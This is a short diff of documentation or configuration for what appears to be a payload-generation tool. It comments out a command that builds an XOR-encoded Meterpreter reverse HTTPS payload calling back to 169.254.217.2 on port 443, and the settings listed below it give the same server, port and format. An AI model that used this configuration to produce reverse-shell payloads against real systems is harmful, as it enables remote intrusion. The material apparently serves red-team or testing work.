@@ -85,7 +85,7 @@ variable you need to change are `msfencoder` arguments and `compiler`.
 
 # Linux
 ## MsfEncode arguments
-msfencoder 169.254.217.2 443 cs xor 0xfa windows/meterpreter/reverse_https
+## msfencoder 169.254.217.2 443 cs xor 0xfa windows/meterpreter/reverse_https
 server: 169.254.217.2
 ports: 443
 format: 'cs'
